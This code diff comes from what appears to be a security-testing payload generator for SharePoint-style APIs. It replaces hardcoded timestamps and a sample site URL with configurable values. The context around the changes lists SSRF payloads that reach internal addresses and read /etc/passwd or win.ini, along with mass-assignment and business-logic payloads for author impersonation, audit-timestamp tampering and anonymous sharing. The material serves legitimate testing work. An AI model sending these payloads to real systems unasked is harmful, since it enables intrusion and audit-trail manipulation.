@@ -5,6 +5,7 @@ import {
   PayloadGenerationContext,
   TestClassification,
 } from "./types";
+import { configuredSiteHost, configuredSiteUrl, configuredTimestamp } from "../config/runtimeValues";
 
 /**
  * Payload generation.
@@ -292,8 +293,8 @@ function massAssignmentPayloads(ctx: PayloadGenerationContext): Payload[] {
   const properties: Array<{ name: string; slug: string; value: unknown; rationale: string }> = [
     { name: "Id", slug: "property-id", value: 1, rationale: "Server-generated primary key should not be assignable." },
     { name: "ID", slug: "property-id-uppercase", value: 1, rationale: "Alternative casing of the same protected identifier." },
-    { name: "Created", slug: "property-created", value: "2000-01-01T00:00:00Z", rationale: "Audit timestamps should be server-controlled." },
-    { name: "Modified", slug: "property-modified", value: "2099-01-01T00:00:00Z", rationale: "Future modification time can hide activity." },
+    { name: "Created", slug: "property-created", value: configuredTimestamp("createdDate"), rationale: "Audit timestamps should be server-controlled." },
+    { name: "Modified", slug: "property-modified", value: configuredTimestamp("futureExpiration"), rationale: "Future modification time can hide activity." },
     { name: "AuthorId", slug: "property-authorid", value: 1, rationale: "Author impersonation if the property is bound." },
     { name: "EditorId", slug: "property-editorid", value: 1, rationale: "Editor impersonation if the property is bound." },
     { name: "GUID", slug: "property-guid", value: "00000000-0000-0000-0000-000000000000", rationale: "Unique id collisions / object confusion." },
@@ -498,7 +499,7 @@ function sqliPayloads(ctx: PayloadGenerationContext): Payload[] {
 function ssrfPayloads(ctx: PayloadGenerationContext): Payload[] {
   const parameter = parameterFor(ctx, "ssrf");
   const location = locationFor(ctx, "ssrf");
-  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : "https://contoso.sharepoint.com/sites/team";
+  const baseline = ctx.baselineValue !== undefined ? ctx.baselineValue : configuredSiteUrl();
   const result: Payload[] = [
     control("ssrf", parameter, location, baseline, "A normal in-tenant URL."),
   ];
@@ -510,7 +511,7 @@ function ssrfPayloads(ctx: PayloadGenerationContext): Payload[] {
     "http://10.0.0.1/",
     "file:///etc/passwd",
     "\\\\localhost\\c$\\windows\\win.ini",
-    "https://contoso.sharepoint.com@127.0.0.1/",
+    "https://" + configuredSiteHost() + "@127.0.0.1/",
   ];
   for (let i = 0; i < values.length; i++) {
     result.push(
@@ -644,12 +645,12 @@ function businessLogicPayloads(ctx: PayloadGenerationContext): Payload[] {
     { name: "Reject via moderation status", value: { _ModerationStatus: 2 }, rationale: "Rejected state may bypass reviewer checks." },
     { name: "Draft state", value: { _ModerationStatus: 3 }, rationale: "Draft visibility and audience rules differ." },
     { name: "Author impersonation", value: { AuthorId: 1 }, rationale: "Audit trail integrity." },
-    { name: "Backdated creation", value: { Created: "2000-01-01T00:00:00Z" }, rationale: "Retention / audit manipulation." },
-    { name: "Future modification", value: { Modified: "2099-01-01T00:00:00Z" }, rationale: "Hides recent changes from time-based reviews." },
+    { name: "Backdated creation", value: { Created: configuredTimestamp("createdDate") }, rationale: "Retention / audit manipulation." },
+    { name: "Future modification", value: { Modified: configuredTimestamp("futureExpiration") }, rationale: "Hides recent changes from time-based reviews." },
     { name: "Version string tampering", value: { OData__UIVersionString: "999.0" }, rationale: "Version checks used by workflow conditions." },
     { name: "Approval awaitAll disabled", value: { awaitAll: false }, rationale: "Single approval may complete a multi-approver request." },
     { name: "Share link to anonymous", value: { request: { createLink: true, settings: { linkKind: 4, role: 1, allowAnonymousAccess: true } } }, rationale: "Sharing policy bypass." },
-    { name: "Expired share link", value: { request: { createLink: true, settings: { linkKind: 4, role: 1, expiration: "2000-01-01T00:00:00Z" } } }, rationale: "Expiration validation." },
+    { name: "Expired share link", value: { request: { createLink: true, settings: { linkKind: 4, role: 1, expiration: configuredTimestamp("pastExpiration") } } }, rationale: "Expiration validation." },
   ];
   for (let i = 0; i < cases.length; i++) {
     result.push(
